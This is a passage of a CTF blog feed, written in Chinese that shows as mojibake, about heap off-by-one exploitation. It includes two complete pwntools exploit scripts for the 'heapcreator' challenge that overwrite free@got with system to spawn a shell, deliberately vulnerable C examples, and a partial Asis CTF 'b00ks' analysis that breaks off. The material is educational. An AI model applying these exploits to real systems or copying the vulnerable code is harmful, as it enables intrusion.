¹æ®æŒ‡å®šçš„ç´¢å¼•ä»¥åŠä¹‹å‰å­˜å‚¨çš„å †çš„å¤§å°è¯»å–å†…å®¹ï¼Œä½†æ˜¯è¿™é‡Œè¯»å…¥çš„é•¿åº¦ä¼šæ¯”ä¹‹å‰å¤§ 1ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨ off by one æ¼æ´ã€‚</li><li>å±•ç¤ºå †ï¼Œè¾“å‡ºæŒ‡å®šç´¢å¼•å †çš„å¤§å°ä»¥åŠå†…å®¹ã€‚</li><li>åˆ é™¤å †ï¼Œåˆ é™¤æŒ‡å®šå †ï¼Œå¹¶ä¸”å°†å¯¹åº”æŒ‡é’ˆè®¾ç½®ä¸ºäº†NULLã€‚</li></ol><h2 id="åˆ©ç”¨">åˆ©ç”¨<a class="post-anchor" href="#åˆ©ç”¨"></a></h2><p>åŸºæœ¬åˆ©ç”¨æ€è·¯å¦‚ä¸‹</p><ol><li>åˆ©ç”¨ off by one æ¼æ´è¦†ç›–ä¸‹ä¸€ä¸ªchunk çš„size å­—æ®µï¼Œä»è€Œæ„é€ ä¼ªé€ çš„chunk å¤§å°ã€‚</li><li>ç”³è¯·ä¼ªé€ çš„chunk å¤§å°ï¼Œä»è€Œäº§ç”Ÿ chunk overlapï¼Œè¿›è€Œä¿®æ”¹å…³é”®æŒ‡é’ˆã€‚</li></ol><p>exp</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *r = process(<span class="hljs-string">'./heapcreator'</span>)heap = ELF(<span class="hljs-string">'./heapcreator'</span>)libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size, content)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"1"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(size))    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx, content)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"2"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"3"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"4"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))free_got = <span class="hljs-number">0x602018</span>create(<span class="hljs-number">0x18</span>, <span class="hljs-string">"dada"</span>)  <span class="hljs-comment"># 0</span>create(<span class="hljs-number">0x10</span>, <span class="hljs-string">"ddaa"</span>)  <span class="hljs-comment"># 1</span><span class="hljs-comment"># overwrite heap 1's struct's size to 0x41</span>edit(<span class="hljs-number">0</span>, <span class="hljs-string">"/bin/sh\x00"</span> + <span class="hljs-string">"a"</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">"\x41"</span>)<span class="hljs-comment"># trigger heap 1's struct to fastbin 0x40</span><span class="hljs-comment"># heap 1's content to fastbin 0x20</span>delete(<span class="hljs-number">1</span>)<span class="hljs-comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span><span class="hljs-comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span><span class="hljs-comment"># that is to say we can overwrite new heap 1's struct</span><span class="hljs-comment"># here we overwrite its heap content pointer to free@got</span>create(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x30</span>) + p64(heap.got[<span class="hljs-string">'free'</span>]))  <span class="hljs-comment">#1</span><span class="hljs-comment"># leak freeaddr</span>show(<span class="hljs-number">1</span>)r.recvuntil(<span class="hljs-string">"Content : "</span>)data = r.recvuntil(<span class="hljs-string">"Done !"</span>)free_addr = u64(data.split(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))libc_base = free_addr - libc.symbols[<span class="hljs-string">'free'</span>]log.success(<span class="hljs-string">'libc base addr: '</span> + hex(libc_base))system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]<span class="hljs-comment">#gdb.attach(r)</span><span class="hljs-comment"># overwrite free@got with system addr</span>edit(<span class="hljs-number">1</span>, p64(system_addr))<span class="hljs-comment"># trigger system("/bin/sh")</span>delete(<span class="hljs-number">0</span>)r.interactive()</code></pre><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh=process(<span class="hljs-string">'./heapcreator'</span>)elf=ELF(<span class="hljs-string">'./heapcreator'</span>)libc=ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,value)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'1'</span>)    sh.recvuntil(<span class="hljs-string">'Size of Heap :'</span>)    sh.sendline(str(size))    sh.recvuntil(<span class="hljs-string">'Content of heap:'</span>)    sh.sendline(value)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,value)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'2'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))    sh.recvuntil(<span class="hljs-string">'Content of heap : '</span>)    sh.sendline(value)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'3'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'4'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))free_got=elf.got[<span class="hljs-string">'free'</span>]create(<span class="hljs-number">0x18</span>,<span class="hljs-string">'aaaaaaa'</span>)  <span class="hljs-comment">#idx0 å®é™…åˆ†é…äº†0x10çš„chunkï¼Œé‡ç”¨idx1çš„prev_sizeçš„8ä¸ªå­—èŠ‚</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'aaaaaaa'</span>)ã€€<span class="hljs-comment">#idx1ã€€ã€€</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'aaaaaaa'</span>)ã€€ã€€<span class="hljs-comment">#idx2</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>)ã€€ã€€<span class="hljs-comment">#idx3</span>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">'\x81'</span>edit(<span class="hljs-number">0</span>,payload)   <span class="hljs-comment">#ä¿®æ”¹idx1çš„sizeä¸º0x81</span>delete(<span class="hljs-number">1</span>)ã€€ã€€<span class="hljs-comment">#idx1è¿›å…¥0x70çš„unsorted bin</span>size=<span class="hljs-string">'\x08'</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x40</span>+size+p64(free_got)create(<span class="hljs-number">0x70</span>,payload)ã€€ã€€<span class="hljs-comment">#åˆ†é…åˆ°idx1 æ­¤æ—¶sizeä¸º0x70ï¼Œå¯ä»¥å †æº¢å‡ºåˆ°idx2ï¼Œä¿®æ”¹idx2çš„å†…å®¹æŒ‡é’ˆä¸ºfree_got</span>show(<span class="hljs-number">2</span>)ã€€ã€€<span class="hljs-comment">#è¾“å‡ºfreeçœŸå®åœ°å€,æ³„éœ²libcåŸºåœ°å€</span>sh.recvuntil(<span class="hljs-string">'Content :'</span>)free_adr=u64(sh.recvline().strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-keyword">print</span> <span class="hljs-string">'free_adr: '</span>+hex(free_adr)libc_base=free_adr-libc.symbols[<span class="hljs-string">'free'</span>]system_adr=libc_base+libc.symbols[<span class="hljs-string">'system'</span>]<span class="hljs-keyword">print</span> <span class="hljs-string">'libc_base: '</span>+hex(libc_base)<span class="hljs-keyword">print</span> <span class="hljs-string">'system_adr: '</span>+hex(system_adr)edit(<span class="hljs-number">2</span>,p64(system_adr)) <span class="hljs-comment">#å°†free_gotæ”¹ä¸ºsystemåœ°å€</span>delete(<span class="hljs-number">3</span>)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="hljs-comment">#free(idx-&gt;content)è§¦å‘</span>sh.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geek 10th write up</title>
      <link href="/2019/10/17/Geek-10th-write-up/"/>
      <url>/2019/10/17/Geek-10th-write-up/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Off-By-Oneå­¦ä¹ </title>
      <link href="/2019/10/10/Off-By-One%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/10/Off-By-One%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ä¸¥æ ¼æ¥è¯´ off-by-one æ¼æ´æ˜¯ä¸€ç§ç‰¹æ®Šçš„æº¢å‡ºæ¼æ´ï¼Œoff-by-one æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚ã€‚</p><h2 id="åŸç†">åŸç†<a class="post-anchor" href="#åŸç†"></a></h2><p>off-by-one æ˜¯æŒ‡å•å­—èŠ‚ç¼“å†²åŒºæº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µã€‚å…¶ä¸­è¾¹ç•ŒéªŒè¯ä¸ä¸¥é€šå¸¸åŒ…æ‹¬</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †å—ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯çš„æ¬¡æ•°è®¾ç½®é”™è¯¯ï¼ˆè¿™åœ¨ C è¯­è¨€åˆå­¦è€…ä¸­å¾ˆå¸¸è§ï¼‰å¯¼è‡´å¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚ã€‚</li><li>å­—ç¬¦ä¸²æ“ä½œä¸åˆé€‚</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œå•å­—èŠ‚æº¢å‡ºè¢«è®¤ä¸ºæ˜¯éš¾ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯å› ä¸º linux çš„å †ç®¡ç†æœºåˆ¶ ptmalloc éªŒè¯çš„æ¾æ•£æ€§ï¼ŒåŸºäº linux å †çš„ off-by-one æ¼æ´åˆ©ç”¨èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œå¹¶ä¸”å¨åŠ›å¼ºå¤§ã€‚æ­¤å¤–ï¼Œéœ€è¦è¯´æ˜çš„ä¸€ç‚¹æ˜¯ off-by-one æ˜¯å¯ä»¥åŸºäºå„ç§ç¼“å†²åŒºçš„ï¼Œæ¯”å¦‚æ ˆã€bssæ®µç­‰ç­‰ã€‚ä½†æ˜¯å †ä¸Šï¼ˆheap basedï¼‰çš„ off-by-one æ˜¯ CTF ä¸­æ¯”è¾ƒå¸¸è§çš„ã€‚æˆ‘ä»¬è¿™é‡Œä»…è®¨è®ºå †ä¸Šçš„ off-by-one æƒ…å†µã€‚</p><h2 id="off-by-one-åˆ©ç”¨æ€è·¯">off-by-one åˆ©ç”¨æ€è·¯<a class="post-anchor" href="#off-by-one-åˆ©ç”¨æ€è·¯"></a></h2><ol><li>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚ä¹Ÿå¯ä½¿ç”¨ NULL å­—èŠ‚æº¢å‡ºçš„æ–¹æ³•</li><li>æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šåœ¨ size ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾—<code>prev_in_use</code>ä½è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚(1) è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚(2) å¦å¤–ï¼Œè¿™æ—¶<code>prev_size</code>åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€ <code>prev_size</code>ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§<code>prev_size</code>æ‰¾åˆ°å—çš„åä¸€å—ï¼ˆç†è®ºä¸Šæ˜¯å½“å‰æ­£åœ¨unlinkçš„å—ï¼‰ä¸å½“å‰æ­£åœ¨ unlink çš„å—å¤§å°æ˜¯å¦ç›¸ç­‰ã€‚</li></ol><p>æœ€æ–°ç‰ˆæœ¬ä»£ç ä¸­ï¼Œå·²åŠ å…¥é’ˆå¯¹ 2 ä¸­åä¸€ç§æ–¹æ³•çš„ check ï¼Œä½†æ˜¯åœ¨ 2.28 å‰å¹¶æ²¡æœ‰è¯¥ checkã€‚</p><pre><code class="hljs cpp"><span class="hljs-comment">/* consolidate backward */</span>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));      <span class="hljs-comment">/* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */</span>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (<span class="hljs-string">"corrupted size vs. prev_size while consolidating"</span>);      unlink_chunk (av, p);    &#125;</code></pre><h3 id="ç¤ºä¾‹1">ç¤ºä¾‹1<a class="post-anchor" href="#ç¤ºä¾‹1"></a></h3><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">my_gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ptr,<span class="hljs-keyword">int</span> size)</span></span>&#123;    <span class="hljs-keyword">int</span> i;    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)    &#123;        ptr[i]=getchar();    &#125;    <span class="hljs-keyword">return</span> i;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *chunk1,*chunk2;    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input:"</span>);    my_gets(chunk1,<span class="hljs-number">16</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ my_gets å‡½æ•°å¯¼è‡´äº†ä¸€ä¸ª off-by-one æ¼æ´ï¼ŒåŸå› æ˜¯ for å¾ªç¯çš„è¾¹ç•Œæ²¡æœ‰æ§åˆ¶å¥½å¯¼è‡´å†™å…¥å¤šæ‰§è¡Œäº†ä¾æ¬¡ï¼Œè¿™ä¹Ÿè¢«ç§°ä¸ºæ …æ é”™è¯¯</p><p>æˆ‘ä»¬ä½¿ç”¨gdb å¯¹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼Œåœ¨è¿›è¡Œè¾“å…¥å‰å¯ä»¥çœ‹åˆ°åˆ†é…çš„ä¸¤ä¸ªç”¨æˆ·åŒºåŸŸä¸º16 å­—èŠ‚çš„å †å—</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk20x602030:   0x0000000000000000  0x0000000000000000</code></pre><p>å½“æˆ‘ä»¬æ‰§è¡Œ my_gets è¿›è¡Œè¾“å…¥ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®å‘ç”Ÿäº†æº¢å‡ºè¦†ç›–åˆ°äº†ä¸‹ä¸€ä¸ªå †å—çš„ prev_size åŸŸ print â€˜Aâ€™*17</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk10x602010:   0x4141414141414141  0x41414141414141410x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk20x602030:   0x0000000000000000  0x0000000000000000</code></pre><h3 id="å®ä¾‹2">å®ä¾‹2<a class="post-anchor" href="#å®ä¾‹2"></a></h3><p>ç¬¬äºŒç§å¸¸è§çš„å¯¼è‡´ off-by-one çš„åœºæ™¯å°±æ˜¯å­—ç¬¦ä¸²æ“ä½œäº†ï¼Œå¸¸è§çš„åŸå› æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸç¬¦è®¡ç®—æœ‰è¯¯</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">""</span>;    <span class="hljs-keyword">void</span> *chunk1;    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input"</span>);    gets(buffer);    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)    &#123;        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ç¨‹åºä¹çœ‹ä¸Šå»æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼ˆä¸è€ƒè™‘æ ˆæº¢å‡ºï¼‰ï¼Œå¯èƒ½å¾ˆå¤šäººåœ¨å®é™…çš„ä»£ç ä¸­ä¹Ÿæ˜¯è¿™æ ·å†™çš„ã€‚<br>ä½†æ˜¯ strlen å’Œ strcpy çš„è¡Œä¸ºä¸ä¸€è‡´å´å¯¼è‡´äº† off-by-one çš„å‘ç”Ÿã€‚<br>strlen æ˜¯æˆ‘ä»¬å¾ˆç†Ÿæ‚‰çš„è®¡ç®— ascii å­—ç¬¦ä¸²é•¿åº¦çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦æ—¶æ˜¯ä¸æŠŠç»“æŸç¬¦ <code>&#39;\x00&#39;</code> è®¡ç®—åœ¨å†…çš„ï¼Œä½†æ˜¯ strcpy åœ¨å¤åˆ¶å­—ç¬¦ä¸²æ—¶ä¼šæ‹·è´ç»“æŸç¬¦ <code>&#39;\x00&#39;</code> ã€‚è¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å‘ chunk1 ä¸­å†™å…¥äº† 25 ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬ä½¿ç”¨ gdb è¿›è¡Œè°ƒè¯•å¯ä»¥çœ‹åˆ°è¿™ä¸€ç‚¹ã€‚</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000210x602010:   0x4141414141414141  0x41414141414141410x602020:   0x4141414141414141  0x0000000000000400</code></pre><p>å¯ä»¥çœ‹åˆ° next chunk çš„ size åŸŸä½å­—èŠ‚è¢«ç»“æŸç¬¦ <code>&#39;\x00&#39;</code> è¦†ç›–ï¼Œè¿™ç§åˆå±äº off-by-one çš„ä¸€ä¸ªåˆ†æ”¯ç§°ä¸º NULL byte off-by-oneï¼Œæˆ‘ä»¬åœ¨åé¢ä¼šçœ‹åˆ° off-by-one ä¸ NULL byte off-by-one åœ¨åˆ©ç”¨ä¸Šçš„åŒºåˆ«ã€‚<br>è¿˜æ˜¯æœ‰ä¸€ç‚¹å°±æ˜¯ä¸ºä»€ä¹ˆæ˜¯ä½å­—èŠ‚è¢«è¦†ç›–å‘¢ï¼Œå› ä¸ºæˆ‘ä»¬é€šå¸¸ä½¿ç”¨çš„ CPU çš„å­—èŠ‚åºéƒ½æ˜¯å°ç«¯æ³•çš„ï¼Œæ¯”å¦‚ä¸€ä¸ª DWORD å€¼åœ¨ä½¿ç”¨å°ç«¯æ³•çš„å†…å­˜ä¸­æ˜¯è¿™æ ·å‚¨å­˜çš„</p><pre><code class="hljs assembly">DWORD 0x41424344å†…å­˜  0x44,0x43,0x42,0x41</code></pre><h3 id="å®ä¾‹1â€“-Asis-CTF-2016-b00ks">å®ä¾‹1â€“ Asis CTF 2016 b00ks<a class="post-anchor" href="#å®ä¾‹1â€“-Asis-CTF-2016-b00ks"></a></h3><p><strong>é¢˜ç›®ä»‹ç»</strong></p><p>é¢˜ç›®æ˜¯ä¸€ä¸ªå¸¸è§çš„èœå•å¼ç¨‹åºï¼ŒåŠŸèƒ½æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ç³»ç»Ÿã€‚</p><pre><code class="hljs python"><span class="hljs-number">1.</span> Create a book<span class="hljs-number">2.</span> Delete a book<span class="hljs-number">3.</span> Edit a book<span class="hljs-number">4.</span> Print book detail<span class="hljs-number">5.</span> Change current author name<span class="hljs-number">6.</span> Exit</code></pre><p>é¢˜ç›®æä¾›äº†åˆ›å»ºã€åˆ é™¤ã€ç¼–è¾‘ã€æ‰“å°å›¾ä¹¦çš„åŠŸèƒ½ã€‚é¢˜ç›®æ˜¯64ä½ç¨‹åºï¼Œä¿æŠ¤å¦‚ä¸‹æ‰€ç¤º</p><pre><code class="hljs bash">Canary                        : NoNX                            : YesPIE                           : YesFortify                       : NoRelRO                         : Full</code></pre><p>ç¨‹åºæ¯åˆ›å»ºä¸€ä¸ª book ä¼šåˆ†é… 0x20 å­—èŠ‚çš„ç»“æ„æ¥ç»´æŠ¤å®ƒçš„ä¿¡æ¯</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span>&#123;</span>    <span class="hljs-keyword">int</span> id;    <span class="hljs-keyword">char</span> *name;    <span class="hljs-keyword">char</span> *description;    <span class="hljs-keyword">int</span> size;&#125;</code></pre><p><strong>create</strong></p><p>book ç»“æ„ä¸­å­˜åœ¨ name å’Œ descriptionï¼Œname å’Œ description åœ¨å †ä¸Šåˆ†é…ã€‚é¦–å…ˆåˆ†é… name bufferï¼Œä½¿ç”¨mallocã€‚å¤§å°è‡ªå®šä½†å°äº 32.</p><pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book name size: "</span>, *(_QWORD *)&amp;size);__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>, &amp;size);ptr = <span class="hljs-built_in">malloc</span>(size);</code></pre><p>ä¹‹ååˆ†é… description ï¼ŒåŒæ ·å¤§å°è‡ªå®šä½†æ— é™åˆ¶ã€‚</p><pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;size);__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);v5 = <span class="hljs-built_in">malloc</span>(size);</code></pre><p>ä¹‹ååˆ†é… book ç»“æ„çš„å†…å­˜</p><pre><code class="hljs cpp">book = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);<span class="hljs-keyword">if</span> ( book )&#123;    *((_DWORD *)book + <span class="hljs-number">6</span>) = size;    *((_QWORD *)off_202010 + v2) = book;    *((_QWORD *)book + <span class="hljs-number">2</span>) = description;    *((_QWORD *)book + <span class="hljs-number">1</span>) = name;    *(_DWORD *)book = ++unk_202024;    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre><p><strong>æ¼æ´</strong></p><p>ç¨‹åºç¼–å†™çš„ read å‡½æ•°å­˜åœ¨ null byte off-by-one æ¼æ´ï¼Œä»”ç»†è§‚å¯Ÿè¿™ä¸ª read å‡½æ•°å¯ä»¥å‘ç°å¯¹äºè¾¹ç•Œçš„è€ƒè™‘æ˜¯ä¸å½“çš„ã€‚</p><pre><code class="hljs cpp"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">my_read</span><span class="hljs-params">(_BYTE *ptr, <span class="hljs-keyword">int</span> number)</span></span>&#123;  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>  _BYTE *buf; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  <span class="hljs-keyword">if</span> ( number &lt;= <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;  buf = ptr;  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )  &#123;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1u</span>LL) != <span class="hljs-number">1</span> )      <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;    <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-string">'\n'</span> )      <span class="hljs-keyword">break</span>;    ++buf;    <span class="hljs-keyword">if</span> ( i == number )      <span class="hljs-keyword">break</span>;  &#125;  *buf = <span class="hljs-number">0</span>; --ã€‹ æ¼æ´ä½ç½®  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre><h4 id="åˆ©ç”¨">åˆ©ç”¨<a class="post-anchor" href="#åˆ©ç”¨"></a></h4><p>åˆ›å»ºä¸¤ä¸ª<code>b00k</code>, åœ¨<code>first b00k</code>ä¸­ä¼ªé€ <code>b00k</code>è¿›è€Œæ§åˆ¶<code>second b00k</code>çš„<code>description</code>æŒ‡é’ˆ, å°†è¯¥æŒ‡é’ˆæ”¹ä¸º<code>__free_hook</code>, ä¿®æ”¹<code>second b00k</code>çš„<code>description</code>ä¸º<code>execve(&quot;/bin/sh&quot;)</code>, æœ€å<code>free</code></p><p><strong>æ³„éœ²</strong></p><p>å› ä¸ºç¨‹åºä¸­çš„ my_read å‡½æ•°å­˜åœ¨ null byte off-by-one ï¼Œäº‹å®ä¸Š my_read è¯»å…¥çš„ç»“æŸç¬¦ â€˜\x00â€™ æ˜¯å†™å…¥åˆ° 0x555555756060 çš„ä½ç½®çš„ã€‚è¿™æ ·å½“ 0x555555756060ï½0x555555756068 å†™å…¥ book æŒ‡é’ˆæ—¶å°±ä¼šè¦†ç›–æ‰ç»“æŸç¬¦ â€˜\x00â€™ ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å­˜åœ¨ä¸€ä¸ªåœ°å€æ³„æ¼çš„æ¼æ´ã€‚é€šè¿‡æ‰“å° author name å°±å¯ä»¥è·å¾— pointer array ä¸­ç¬¬ä¸€é¡¹çš„å€¼ã€‚</p><p>books ä½ç½®</p><pre><code class="hljs assembly">        0x55865b7c9040:    0x4141414141414141    0x4141414141414141        0x55865b7c9050:    0x4141414141414141    0x4141414141414141 --&gt; authorb00ks&lt;--0x55865b7c9060:    0x000055865cc0d160(first book)    0x0000000000000000</code></pre><p>null byte overflow</p><pre><code 